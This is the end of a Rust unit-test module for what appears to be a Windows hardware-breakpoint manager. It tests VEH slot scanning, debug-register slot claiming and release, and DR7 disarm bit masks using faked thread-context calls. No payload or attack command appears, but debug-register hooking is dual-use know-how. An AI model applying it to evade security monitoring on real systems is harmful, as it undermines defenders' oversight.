        wr_u64(&mut ctx, CTX_RIP, 0x9999);
        assert!(unsafe { veh_scan_slots(2, 0x9999, 0x1000, ctx.as_mut_ptr()) });
        assert_eq!(
            rd_u64(&ctx, CTX_RIP),
            0x9999,
            "claimed slot must not redirect"
        );
        assert_eq!(rd_u64(&ctx, CTX_DR6), 0);
        assert_ne!(rd_u32(&ctx, CTX_EFLAGS) & RF_BIT, 0);
        HWBP_SLOT_STATE[1].store(SLOT_VACANT, Ordering::Release);
    }

    /// The armer's slot claim: four slots claim in order, the fifth fails;
    /// states are restored afterwards.
    #[test]
    fn claim_slot_exhausts_pool() {
        for want in 0..4usize {
            assert_eq!(claim_slot(), Ok(want));
        }
        assert_eq!(claim_slot(), Err("all 4 DR slots full"));
        for slot in HWBP_SLOT_STATE.iter() {
            slot.store(SLOT_VACANT, Ordering::Release);
        }
    }

    /// Disarm bookkeeping: publishing VACANT decrements the live count and
    /// frees the slot (active_count reads the same counter).
    #[test]
    fn publish_slot_vacant_updates_count_and_state() {
        HWBP_COUNT.store(2, Ordering::Release);
        HWBP_SLOT_STATE[2].store(SLOT_OCCUPIED, Ordering::Release);
        publish_slot_vacant(2);
        assert_eq!(active_count(), 1);
        assert_eq!(HWBP_SLOT_STATE[2].load(Ordering::Acquire), SLOT_VACANT);
        HWBP_COUNT.store(0, Ordering::Release);
    }

    /// DR7 disarm math: only the target slot's L/G (bits 2s..2s+1) and
    /// R/W+LEN (bits 16+4s..19+4s) are cleared; every other slot's bits
    /// survive. DRx/DR6 are zeroed and DEBUG_REGISTERS is requested.
    #[test]
    fn disarm_dr_register_clears_only_own_slot_bits() {
        static CAPTURED_DR7: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
        unsafe extern "system" fn fake_get(_h: usize, ctx: usize) -> i32 {
            // Pretend the thread has every DR7 bit set.
            ctx_write_u64_at(ctx, CTX_DR7, u64::MAX);
            0
        }
        unsafe extern "system" fn fake_set(_h: usize, ctx: usize) -> i32 {
            CAPTURED_DR7.store(ctx_read_u64_at(ctx, CTX_DR7), Ordering::Release);
            0
        }
        let mut buf = [0xFFu8; 1232];
        buf[CTX_CONTEXT_FLAGS..CTX_CONTEXT_FLAGS + 4].copy_from_slice(&0u32.to_le_bytes());
        let base = buf.as_mut_ptr() as usize;
        assert!(unsafe { disarm_dr_register(base, 1, fake_get, fake_set) });
        // !(0x3 << 2) & !(0xF << 20) applied to all-ones.
        let want = u64::MAX & !(0x3u64 << 2) & !(0xFu64 << 20);
        assert_eq!(CAPTURED_DR7.load(Ordering::Acquire), want);
        assert_eq!(rd_u64(&buf, CTX_DR0 + 8), 0, "DR1 must be zeroed");
        assert_eq!(rd_u64(&buf, CTX_DR6), 0, "DR6 must be zeroed");
        assert_eq!(rd_u32(&buf, CTX_CONTEXT_FLAGS), CONTEXT_DEBUG_REGISTERS);
    }
}
